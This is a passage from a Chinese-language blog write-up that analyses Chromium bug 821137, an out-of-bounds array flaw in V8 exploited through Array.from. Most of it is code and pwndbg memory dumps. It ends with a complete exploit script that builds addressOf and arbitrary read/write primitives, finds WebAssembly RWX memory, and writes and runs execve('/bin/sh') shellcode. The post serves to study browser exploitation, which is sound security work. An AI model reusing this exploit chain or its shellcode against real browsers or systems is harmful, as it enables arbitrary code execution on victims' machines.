<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for(let i &#x3D; 0; i &lt; maxSize; i++)&#123;</span><br><span class="line">    let val &#x3D; dt.f2i(oobArray[i]);</span><br><span class="line">    if(0xbeef00000000&#x3D;&#x3D;&#x3D;val)&#123;</span><br><span class="line">        offsetBuf &#x3D; i-3;</span><br><span class="line">        console.log(&quot;buf offset: &quot; + offsetBuf);</span><br><span class="line">    &#125;</span><br><span class="line">    if(0xdead00000000&#x3D;&#x3D;&#x3D;val)&#123;</span><br><span class="line">        offsetObjLeak &#x3D; i-1;</span><br><span class="line">        console.log(&quot;objGen.leak offset: &quot; + offsetObjLeak);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中JSArrayBuffer和objGen在内存中的存储如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x155d775640a9: [JSArray]</span><br><span class="line"> - map: 0x27e8a9702729 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x37429d985539 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x155d775640c9 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1c4546382251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1c45463cff89 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x155d775640c9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x317427c912b1 &lt;JSArray[8224]&gt;</span><br><span class="line">           1: 0x317427c91269 &lt;JSArray[1]&gt;</span><br><span class="line">           2: 0x317427c91239 &lt;JSArray[1]&gt;</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x317427c91269</span><br><span class="line">0x317427c91269: [JSArray]</span><br><span class="line"> - map: 0x27e8a9702729 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x37429d985539 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x155d77563fb9 &lt;FixedArray[17]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x1c4546382251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1c45463cff89 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x155d77563fb9 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">           0: 0x155d77563ec9 &lt;objGen map &#x3D; 0x27e8a970d519&gt;</span><br><span class="line">        1-16: 0x1c4546382321 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x&#x2F;10xg 0x155d77563ec9-1</span><br><span class="line">0x155d77563ec8:	0x000027e8a970d519	0x00001c4546382251</span><br><span class="line">0x155d77563ed8:	0x00001c4546382251	0x0000123400000000</span><br><span class="line">0x155d77563ee8:	0x0000dead00000000	&#x2F;&#x2F;flag	0x0000282d394823b9</span><br><span class="line">0x155d77563ef8:	0x0000282d394823b9	0x0000282d394823b9</span><br><span class="line">0x155d77563f08:	0x0000282d394823b9	0x0000282d394823b9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x317427c91239</span><br><span class="line">0x317427c91239: [JSArray]</span><br><span class="line"> - map: 0x27e8a9702729 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x37429d985539 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x155d77563d29 &lt;FixedArray[17]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x1c4546382251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1c45463cff89 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x155d77563d29 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">           0: 0x155d77563cd9 &lt;ArrayBuffer map &#x3D; 0x27e8a9703fe9&gt;</span><br><span class="line">        1-16: 0x1c4546382321 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x155d77563cd9</span><br><span class="line">0x155d77563cd9: [JSArrayBuffer]</span><br><span class="line"> - map: 0x27e8a9703fe9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x37429d992981 &lt;Object map &#x3D; 0x27e8a9704041&gt;</span><br><span class="line"> - elements: 0x1c4546382251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store: 0x55cf2f44a130</span><br><span class="line"> - byte_length: 48879</span><br><span class="line"> - neuterable</span><br><span class="line"> - properties: 0x1c4546382251 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields &#x3D; &#123;</span><br><span class="line">    (nil)</span><br><span class="line">    (nil)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x&#x2F;10xg 0x155d77563cd9-1</span><br><span class="line">0x155d77563cd8:	0x000027e8a9703fe9	0x00001c4546382251</span><br><span class="line">0x155d77563ce8:	0x00001c4546382251	0x0000beef00000000	&#x2F;&#x2F;flag</span><br><span class="line">0x155d77563cf8:	0x000055cf2f44a130	0x000055cf2f44a130</span><br><span class="line">0x155d77563d08:	0x000000000000beef	0x0000000000000004</span><br><span class="line">0x155d77563d18:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;10xg 0x55cf2f44a130-0x10	&#x2F;&#x2F;backing_store指向内存区，chunk size&#x3D;0xbf01，申请0xbeef，字节对齐后0xbef0+0x11</span><br><span class="line">0x55cf2f44a120:	0x0000000000000000	0x000000000000bf01</span><br><span class="line">0x55cf2f44a130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf2f44a140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf2f44a150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf2f44a160:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="利用wasm执行任意代码"><a href="#利用wasm执行任意代码" class="headerlink" title="利用wasm执行任意代码"></a>利用wasm执行任意代码</h4><p>​    搜索得到可控的JSArrayBuffer对象后就获得了任意地址读写的能力，任意代码执行可以通过堆利用中常规的构造unsorted bin泄露libc，进而修改malloc_hook劫持控制流；对于v8也可以通过wasm获得一块rwx的内存，把shellcode写进这块内存再调用wasm的接口就可以执行shellcode了。</p>
<p>​    我们实例化一个wasm的对象funcAsm，通过读取前面控制的JSArrayBuffer的内容可以得到funcAsm的地址。funcAsm实际上是一个JSFunction类型的对象，实际执行的代码位于一块rwx的内存中，通过任意地址写修改这块rwx内存的内容再调用funcAsm就可以执行任意代码了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var wasmModule &#x3D; new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">var funcAsm &#x3D; wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var addressFasm &#x3D; addressOf(funcAsm);</span><br></pre></td></tr></table></figure>

<p>不同版本的v8中这块rwx的内存位置可能不同，在这个版本中调试发现位于wasmInstance.exports.main-&gt;shared_info-&gt;code-&gt;code+0x70的位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sharedInfo: 33498958838225</span><br><span class="line">codeAddr: 52817528690241</span><br><span class="line">memoryRWX: 0x00002dd1ea0ae000</span><br><span class="line">0x1e77958abae1 &lt;JSFunction 0 (sfi &#x3D; 0x1e77958ab9d1)&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;20xg 0x30098A091641-1</span><br><span class="line">0x30098a091640:	0x00003556529828e1	0x00001e77958ab781</span><br><span class="line">0x30098a091650:	0x00003a9562c02251	0x00003a9562c02661</span><br><span class="line">0x30098a091660:	0x00001e77958ab799	0x0000049000000043</span><br><span class="line">0x30098a091670:	0x000000000000002c	0xffffffff00000000</span><br><span class="line">0x30098a091680:	0xffffffff00000000	0x0000000000000000</span><br><span class="line">0x30098a091690:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x30098a0916a0:	0xbe485756e5894855	0x00005556054ee6f0</span><br><span class="line">0x30098a0916b0:	0x2dd1ea0ae000ba49	&#x2F;&#x2F;rwx	0xe0c148d2ff410000</span><br><span class="line">0x30098a0916c0:	0x0008c25de58b4820	0x00000001001f0f90</span><br><span class="line">0x30098a0916d0:	0x0000001d00000003	0xffffffff0fffffff</span><br><span class="line">pwndbg&gt; vmmap 0x00002dd1ea0ae000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x2dd1ea0ae000     0x2dd1ea0af000 rwxp     1000 0 </span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>​    代码来源<a target="_blank" rel="noopener" href="https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/">https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">var isdebug&#x3D;1;</span><br><span class="line">function dp(...obj)&#123;</span><br><span class="line">	if(isdebug)&#123;</span><br><span class="line">		for(let i&#x3D;0;obj[i];i++)&#123;</span><br><span class="line">			%DebugPrint(obj[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	%SystemBreak();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class typeConvert&#123;</span><br><span class="line">	constructor()&#123;</span><br><span class="line">		this.buf &#x3D; new ArrayBuffer(8);</span><br><span class="line">		this.f64 &#x3D; new Float64Array(this.buf);</span><br><span class="line">		this.u32 &#x3D; new Uint32Array(this.buf);</span><br><span class="line">		this.bytes &#x3D; new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;convert float to int</span><br><span class="line">	f2i(val)&#123;		</span><br><span class="line">		this.f64[0] &#x3D; val;</span><br><span class="line">		let tmp &#x3D; Array.from(this.u32);</span><br><span class="line">		return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;   </span><br><span class="line">    &#x2F;*</span><br><span class="line">    convert int to float</span><br><span class="line">    if nead convert a 64bits int to float</span><br><span class="line">    please use string like &quot;deadbeefdeadbeef&quot;</span><br><span class="line">    (v8&#39;s SMI just use 56bits, lowest 8bits is zero as flag)</span><br><span class="line">    *&#x2F;</span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        let vall &#x3D; hex(val);</span><br><span class="line">		let tmp &#x3D; [];</span><br><span class="line">        tmp[0] &#x3D; vall.slice(10, );</span><br><span class="line">        tmp[1] &#x3D; vall.slice(2, 10);</span><br><span class="line">        tmp[0] &#x3D; parseInt(tmp[0], 16);</span><br><span class="line">		tmp[1] &#x3D; parseInt(tmp[1], 16);</span><br><span class="line">		this.u32.set(tmp);</span><br><span class="line">		return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;convert number to hex string</span><br><span class="line">function hex(x)</span><br><span class="line">&#123;</span><br><span class="line">    return &#39;0x&#39; + (x.toString(16)).padStart(16, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var dt &#x3D; new typeConvert();</span><br><span class="line"></span><br><span class="line">&#x2F;*generate a Out-Of-Bound array and generate many ArrayBuffers and objects*&#x2F;</span><br><span class="line">var bufArray &#x3D; [];</span><br><span class="line">var objArray &#x3D; [];</span><br><span class="line">var oobArray &#x3D; [1.1];</span><br><span class="line">var maxSize &#x3D; 8224;</span><br><span class="line">function objGen(tag)&#123;</span><br><span class="line">    this.leak &#x3D; 0x1234;</span><br><span class="line">    this.tag &#x3D; tag;</span><br><span class="line">&#125;</span><br><span class="line">Array.from.call(function() &#123; return oobArray &#125;, &#123;[Symbol.iterator] : x &#x3D;&gt; (</span><br><span class="line">    &#123;</span><br><span class="line">        counter : 0,</span><br><span class="line">        next() &#123;</span><br><span class="line">        let result &#x3D; 1.1;</span><br><span class="line">        this.counter++;</span><br><span class="line">        if (this.counter &gt; maxSize) &#123;</span><br><span class="line">            oobArray.length &#x3D; 1;</span><br><span class="line">            bufArray.push(new ArrayBuffer(0xbeef));</span><br><span class="line">            objArray.push(new objGen(0xdead));</span><br><span class="line">            return &#123;done: true&#125;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#123;value: result, done: false&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;*------search a ArrayBuffer which could be controlled by oobArray-------*&#x2F;</span><br><span class="line">var offsetBuf; &#x2F;&#x2F;target offset of oobArray</span><br><span class="line">var indexBuf;  &#x2F;&#x2F;target offset in bufArray</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;dp(oobArray,objArray,bufArray);</span><br><span class="line"></span><br><span class="line">for(let x&#x3D;0; x&lt;&#x3D;maxSize; x++) &#123;let y &#x3D; oobArray[x]&#125;; &#x2F;&#x2F;trigger the GC</span><br><span class="line">&#x2F;&#x2F;search obj&amp;JSArray offset</span><br><span class="line">for(let i &#x3D; 0; i &lt; maxSize; i++)&#123;</span><br><span class="line">    let val &#x3D; dt.f2i(oobArray[i]);</span><br><span class="line">    if(0xbeef00000000&#x3D;&#x3D;&#x3D;val)&#123;</span><br><span class="line">        offsetBuf &#x3D; i-3;</span><br><span class="line">        console.log(&quot;buf offset: &quot; + offsetBuf);</span><br><span class="line">    &#125;</span><br><span class="line">    if(0xdead00000000&#x3D;&#x3D;&#x3D;val)&#123;</span><br><span class="line">        offsetObjLeak &#x3D; i-1;</span><br><span class="line">        console.log(&quot;objGen.leak offset: &quot; + offsetObjLeak);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;dp(oobArray,objArray,bufArray);</span><br><span class="line"></span><br><span class="line">function addressOf(target)&#123;</span><br><span class="line">    objArray[0].leak &#x3D; target;</span><br><span class="line">    return dt.f2i(oobArray[offsetObjLeak]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*---------------------arbitrary address read &#x2F; write--------------------*&#x2F;</span><br><span class="line">&#x2F;&#x2F; arbitrary address write</span><br><span class="line">var dtView &#x3D; new DataView(bufArray[0]);</span><br><span class="line">function write64(addr, value)&#123;</span><br><span class="line">    oobArray[offsetBuf+4] &#x3D; dt.i2f(addr);</span><br><span class="line">    dtView.setFloat64(0, dt.i2f(value), true);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; arbitrary address read</span><br><span class="line">function read64(addr, str&#x3D;false)&#123;</span><br><span class="line">    oobArray[offsetBuf+4] &#x3D; dt.i2f(addr);</span><br><span class="line">    let tmp &#x3D; [&#39;&#39;, &#39;&#39;];</span><br><span class="line">    let tmp2 &#x3D; [&#39;&#39;, &#39;&#39;];</span><br><span class="line">    let result &#x3D; &#39;&#39;</span><br><span class="line">    tmp[1] &#x3D; hex(dtView.getUint32(0)).slice(10,);</span><br><span class="line">    tmp[0] &#x3D; hex(dtView.getUint32(4)).slice(10,);</span><br><span class="line">    for(let i&#x3D;3; i&gt;&#x3D;0; i--)&#123;</span><br><span class="line">        tmp2[0] +&#x3D; tmp[0].slice(i*2, i*2+2);</span><br><span class="line">        tmp2[1] +&#x3D; tmp[1].slice(i*2, i*2+2);</span><br><span class="line">    &#125;</span><br><span class="line">    result &#x3D; tmp2[0]+tmp2[1]</span><br><span class="line">    if(str&#x3D;&#x3D;true)&#123;return &#39;0x&#39;+result&#125;</span><br><span class="line">    else &#123;return parseInt(result, 16)&#125;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------use wasm to execute shellcode------------------*&#x2F;</span><br><span class="line">var wasmCode &#x3D; new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,</span><br><span class="line">    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,</span><br><span class="line">    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,</span><br><span class="line">    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,10,11]);</span><br><span class="line">var wasmModule &#x3D; new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">var funcAsm &#x3D; wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;dp(funcAsm);</span><br><span class="line"></span><br><span class="line">var addressFasm &#x3D; addressOf(funcAsm);</span><br><span class="line">console.log(&quot;addressFasm: &quot;+addressFasm);</span><br><span class="line">var sharedInfo &#x3D; read64(addressFasm+0x18-0x1);</span><br><span class="line">console.log(&quot;sharedInfo: &quot;+sharedInfo);</span><br><span class="line">var codeAddr &#x3D; read64(sharedInfo+0x8-0x1);</span><br><span class="line">console.log(&quot;codeAddr: &quot;+codeAddr);</span><br><span class="line">var memoryRWX &#x3D; (read64(codeAddr+0x70-0x1)&#x2F;0x10000);</span><br><span class="line">memoryRWX &#x3D; Math.floor(memoryRWX);</span><br><span class="line">console.log(&quot;memoryRWX: &quot;+hex(memoryRWX));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;dp(funcAsm);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;sys_execve(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">var shellcode &#x3D; [</span><br><span class="line">    &#39;2fbb485299583b6a&#39;,</span><br><span class="line">    &#39;5368732f6e69622f&#39;,</span><br><span class="line">    &#39;050f5e5457525f54&#39;</span><br><span class="line">];</span><br><span class="line">&#x2F;&#x2F;write shellcode into RWX memory</span><br><span class="line">var offsetMem &#x3D; 0;</span><br><span class="line">for(x of shellcode)&#123;</span><br><span class="line">    write64(memoryRWX+offsetMem, x);</span><br><span class="line">    offsetMem+&#x3D;8;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;call funcAsm() and it would execute shellcode actually</span><br><span class="line">funcAsm();</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    这篇文章分析了chromium821137漏洞的原理，介绍了v8的一些基础数据结构，并通过chromium821137学习了v8利用的基础知识，希望读者通过阅读调试能有所收获。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>​    漏洞地址<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=821137">https://bugs.chromium.org/p/chromium/issues/detail?id=821137</a></p>
<p>​    v8环境搭建<a target="_blank" rel="noopener" href="https://www.cnblogs.com/snip3r/p/12290133.html">https://www.cnblogs.com/snip3r/p/12290133.html</a></p>
<p>​    v8快元素<a target="_blank" rel="noopener" href="https://blog.crimx.com/2018/11/25/v8-fast-properties/">https://blog.crimx.com/2018/11/25/v8-fast-properties/</a></p>
<p>​    v8内存模型<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/28780798">https://zhuanlan.zhihu.com/p/28780798</a></p>
<p>​    v8垃圾回收<a target="_blank" rel="noopener" href="http://www.jayconrod.com/posts/55/a-tour-of-v8-garbage-collection">http://www.jayconrod.com/posts/55/a-tour-of-v8-garbage-collection</a></p>
<p>​    exp <a target="_blank" rel="noopener" href="https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/">https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/</a> </p>
</div></div><div class="post-main post-comment"></div></article><link rel="stylesheet" type="text/css" href="/css/font.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
  $(".fancybox").fancybox();
});
</script></body></html>